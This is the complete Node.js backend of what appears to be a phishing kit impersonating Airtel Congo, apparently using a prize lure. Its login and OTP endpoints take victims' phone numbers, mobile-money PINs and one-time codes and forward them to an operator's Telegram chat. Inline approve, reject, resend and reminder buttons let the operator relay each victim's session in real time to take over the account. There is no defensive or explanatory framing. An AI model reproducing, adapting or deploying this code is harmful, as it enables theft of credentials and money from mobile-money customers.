/* ============================================================
   Airtel Congo — Backend (Render)
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

/* ==================== ENV ==================== */
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const TELEGRAM_CHAT_ID   = (process.env.TELEGRAM_CHAT_ID   || '').trim();

const TELEGRAM_API          = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const TELEGRAM_ANSWER_URL   = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
const TELEGRAM_EDIT_URL     = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
const TELEGRAM_WEBHOOK_URL  = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`;

const SESSION_TIMEOUT_MS = 10 * 60 * 1000;

/* ==================== IN-MEMORY STORE ==================== */
const requests = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, r] of requests.entries()) {
    if (r.status === 'pending' && now - r.createdAt > SESSION_TIMEOUT_MS) {
      r.status = 'expired';
      r.resolvedAt = now;
    }
    if (now - r.createdAt > SESSION_TIMEOUT_MS * 2) {
      requests.delete(id);
    }
  }
}, 60 * 1000);

/* ==================== MIDDLEWARE ==================== */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

const PUBLIC_DIR = path.join(__dirname, '..');
app.use(express.static(PUBLIC_DIR));

/* ==================== HELPERS ==================== */
function makeRequestId() {
  return 'req_' + crypto.randomBytes(12).toString('hex');
}

function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{7,15}$/.test(phone.replace(/\s/g, ''));
}

function stripFirstLine(text) {
  if (!text) return '';
  const idx = text.indexOf('\n');
  if (idx === -1) return '';
  const rest = text.slice(idx + 1);
  return rest.replace(/^━+\n/, '').trim();
}

/* ==================== TELEGRAM KEYBOARDS ==================== */
function buildKeyboardLogin(requestId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approuver', callback_data: `approve:login:${requestId}` },
        { text: '❌ Rejeter',   callback_data: `reject:login:${requestId}` }
      ]
    ]
  };
}

function buildKeyboardOtp(requestId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approuver', callback_data: `approve:otp:${requestId}` },
        { text: '❌ Rejeter',   callback_data: `reject:otp:${requestId}` }
      ],
      [
        { text: '🔁 Renvoyer',  callback_data: `resend:otp:${requestId}` },
        { text: '⏰ Rappel',    callback_data: `reminder:otp:${requestId}` }
      ]
    ]
  };
}

/* ==================== TELEGRAM SEND ==================== */
async function sendTelegramWithButtons(text, requestId, step) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing');
    return null;
  }
  try {
    const keyboard = step === 'otp'
      ? buildKeyboardOtp(requestId)
      : buildKeyboardLogin(requestId);

    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: keyboard
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return null;
    }
    return data.result.message_id || null;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return null;
  }
}

async function editTelegramMessage(messageId, text, replyMarkup) {
  if (!messageId || !TELEGRAM_BOT_TOKEN) return;
  try {
    const body = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (replyMarkup !== undefined) body.reply_markup = replyMarkup;

    await fetch(TELEGRAM_EDIT_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error('editTelegramMessage failed:', err.message);
  }
}

async function answerCallback(callbackQueryId, text) {
  if (!callbackQueryId || !TELEGRAM_BOT_TOKEN) return;
  try {
    await fetch(TELEGRAM_ANSWER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false
      })
    });
  } catch (err) {
    console.error('answerCallback failed:', err.message);
  }
}

/* ==================== PAGE ROUTES ==================== */
function servePage(filename) {
  return (_req, res) => {
    const filePath = path.join(PUBLIC_DIR, filename);
    if (!fs.existsSync(filePath)) {
      return res.status(404).send(`Page ${filename} not found.`);
    }
    res.sendFile(filePath);
  };
}

app.get(['/', '/index', '/index/'], servePage('index.html'));
app.get(['/login', '/login/'], servePage('login.html'));
app.get(['/otp', '/otp/'], servePage('otp.html'));
app.get(['/success', '/success/'], servePage('success.html'));

/* ==================== API — LOGIN ==================== */
app.post('/api/login', async (req, res) => {
  try {
    const { phone = '', pin = '', amount = 0, session = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ success: false, error: 'Numéro de téléphone invalide' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      return res.status(400).json({ success: false, error: 'Code PIN invalide' });
    }

    const requestId = makeRequestId();

    const text =
      `🔐 <b>NOUVELLE CONNEXION</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇨🇩 <b>Pays:</b> Congo (25 ans)\n` +
      `🏆 <b>Prix:</b> $${Number(amount).toLocaleString('en-US')}\n` +
      `📱 <b>Téléphone:</b> <code>+243 ${escapeHtml(phone.replace(/^0/, ''))}</code>\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}\n\n` +
      `⏳ Appuyez sur ✅ ou ❌ ci-dessous`;

    const messageId = await sendTelegramWithButtons(text, requestId, 'login');
    console.log(`[login] requestId=${requestId} msgId=${messageId}`);

    requests.set(requestId, {
      step: 'login',
      status: 'pending',
      data: { phone, pin, amount, session },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ success: true, request_id: requestId });
  } catch (err) {
    console.error('login error:', err);
    return res.status(500).json({ success: false, error: 'Erreur serveur' });
  }
});

app.get('/api/login/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  const r = requests.get(requestId);

  if (!r) return res.json({ status: 'unknown' });

  if (r.status === 'pending' && Date.now() - r.createdAt > SESSION_TIMEOUT_MS) {
    r.status = 'expired';
    r.resolvedAt = Date.now();
  }

  return res.json({ status: r.status });
});

/* ==================== API — OTP ==================== */
app.post('/api/otp', async (req, res) => {
  try {
    const { phone = '', otp = '', amount = 0, session = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ success: false, error: 'Numéro de téléphone invalide' });
    }
    // Accept any non-empty OTP (digits, message, whatever)
    if (typeof otp !== 'string' || otp.length === 0) {
      return res.status(400).json({ success: false, error: 'Code OTP invalide' });
    }

    const requestId = makeRequestId();

    const text =
      `🔢 <b>NOUVEL OTP</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇨🇩 <b>Pays:</b> Congo (25 ans)\n` +
      `🏆 <b>Prix:</b> $${Number(amount).toLocaleString('en-US')}\n` +
      `📱 <b>Téléphone:</b> <code>+243 ${escapeHtml(phone.replace(/^0/, ''))}</code>\n` +
      `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🕒 <b>Heure:</b> ${new Date().toLocaleString('fr-FR')}\n\n` +
      `⏳ Appuyez sur ✅ / ❌ / 🔁 / ⏰ ci-dessous`;

    const messageId = await sendTelegramWithButtons(text, requestId, 'otp');
    console.log(`[otp] requestId=${requestId} msgId=${messageId}`);

    requests.set(requestId, {
      step: 'otp',
      status: 'pending',
      data: { phone, otp, amount, session },
      originalText: text,
      createdAt: Date.now(),
      resolvedAt: null,
      telegramMessageId: messageId
    });

    return res.json({ success: true, request_id: requestId });
  } catch (err) {
    console.error('otp error:', err);
    return res.status(500).json({ success: false, error: 'Erreur serveur' });
  }
});

app.get('/api/otp/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  const r = requests.get(requestId);

  if (!r) return res.json({ status: 'unknown' });

  if (r.status === 'pending' && Date.now() - r.createdAt > SESSION_TIMEOUT_MS) {
    r.status = 'expired';
    r.resolvedAt = Date.now();
  }

  return res.json({ status: r.status });
});

/* ==================== API — TELEGRAM WEBHOOK ==================== */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cb = update.callback_query;

    if (!cb || !cb.data) return res.json({ ok: true });

    const [action, step, requestId] = String(cb.data).split(':');
    const r = requests.get(requestId);

    console.log(`[webhook] action=${action} step=${step} requestId=${requestId} found=${!!r}`);

    if (!r) {
      await answerCallback(cb.id, 'Session expirée');
      return res.json({ ok: true });
    }

    if (r.status === 'approved' || r.status === 'rejected' || r.status === 'expired') {
      await answerCallback(cb.id, `Déjà ${r.status}`);
      return res.json({ ok: true });
    }

    const when = new Date().toLocaleString('fr-FR');

    /* RESEND */
    if (action === 'resend') {
      r.status = 'pending';
      r.resendRequestedAt = Date.now();
      await answerCallback(cb.id, 'Renvoyer demandé');

      const preservedBody = stripFirstLine(r.originalText);
      const newText =
        `🔁 <b>RENVOI DEMANDÉ</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Renvoi:</b> ${when}`;

      if (r.telegramMessageId) {
        await editTelegramMessage(r.telegramMessageId, newText, {
          inline_keyboard: [
            [
              { text: '✅ Approuver', callback_data: `approve:${step}:${requestId}` },
              { text: '❌ Rejeter',   callback_data: `reject:${step}:${requestId}` }
            ]
          ]
        });
      }

      return res.json({ ok: true });
    }

    /* REMINDER */
    if (action === 'reminder') {
      await answerCallback(cb.id, 'Rappel envoyé');

      const preservedBody = stripFirstLine(r.originalText);
      const newText =
        `⏰ <b>RAPPEL ENVOYÉ</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        preservedBody +
        `\n\n🕒 <b>Rappel:</b> ${when}`;

      if (r.telegramMessageId) {
        await editTelegramMessage(r.telegramMessageId, newText, {
          inline_keyboard: [
            [
              { text: '✅ Approuver', callback_data: `approve:${step}:${requestId}` },
              { text: '❌ Rejeter',   callback_data: `reject:${step}:${requestId}` }
            ],
            [
              { text: '🔁 Renvoyer',  callback_data: `resend:${step}:${requestId}` }
            ]
          ]
        });
      }

      return res.json({ ok: true });
    }

    /* APPROVE / REJECT */
    if (action === 'approve') {
      r.status = 'approved';
      r.resolvedAt = Date.now();
      await answerCallback(cb.id, 'Approuvé');
    } else if (action === 'reject') {
      r.status = 'rejected';
      r.resolvedAt = Date.now();
      await answerCallback(cb.id, 'Rejeté');
    } else {
      await answerCallback(cb.id, 'Action inconnue');
      return res.json({ ok: true });
    }

    const statusLine = action === 'approve' ? '✅ <b>APPROUVÉ</b>' : '❌ <b>REJETÉ</b>';

    const preservedBody = stripFirstLine(r.originalText);
    const newText =
      `${statusLine}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      preservedBody +
      `\n\n🕒 <b>Résolu:</b> ${when}`;

    if (r.telegramMessageId) {
      await editTelegramMessage(r.telegramMessageId, newText, { inline_keyboard: [] });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('webhook error:', err);
    return res.json({ ok: true });
  }
});

/* ==================== 404 ==================== */
app.use((_req, res) => {
  res.status(404).send(`
    <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
      <h1 style="font-size:48px;margin:0;color:#111827;">404</h1>
      <p style="color:#6b7280;margin-top:12px;">Page introuvable.</p>
      <a href="/" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#c0001a;color:#fff;text-decoration:none;font-weight:900;border-radius:10px;">Retour à l'accueil</a>
    </body></html>
  `);
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).send('Erreur serveur');
});

/* ==================== WEBHOOK REGISTRATION ==================== */
async function registerWebhook() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.warn('⚠️ Cannot register webhook — TELEGRAM_BOT_TOKEN missing');
    return;
  }

  let publicUrl = process.env.PUBLIC_URL || '';
  if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
    publicUrl = process.env.RENDER_EXTERNAL_URL;
  }
  if (!publicUrl && process.env.RAILWAY_PUBLIC_DOMAIN) {
    publicUrl = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`;
  }
  publicUrl = publicUrl.replace(/\/+$/, '');

  if (!publicUrl) {
    console.warn('⚠️ No PUBLIC_URL / RENDER_EXTERNAL_URL / RAILWAY_PUBLIC_DOMAIN set');
    return;
  }

  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log('🔗 Registering webhook:', webhookUrl);

  try {
    const res = await fetch(TELEGRAM_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ['message', 'callback_query']
      })
    });
    const data = await res.json().catch(() => ({}));
    if (data.ok) {
      console.log('✅ Telegram webhook registered:', webhookUrl);
    } else {
      console.warn('⚠️ Webhook registration failed:', data.description || data);
    }
  } catch (err) {
    console.error('❌ Webhook registration error:', err.message);
  }
}

/* ==================== START ==================== */
app.listen(PORT, async () => {
  console.log('====================================');
  console.log('🏆 Airtel Congo — Backend running (Render)');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
  console.log(`🔍 Chat ID length: ${TELEGRAM_CHAT_ID.length}`);
  console.log(`🔍 Chat ID raw: ${JSON.stringify(TELEGRAM_CHAT_ID)}`);
  console.log('====================================');
  setTimeout(registerWebhook, 2000);
});
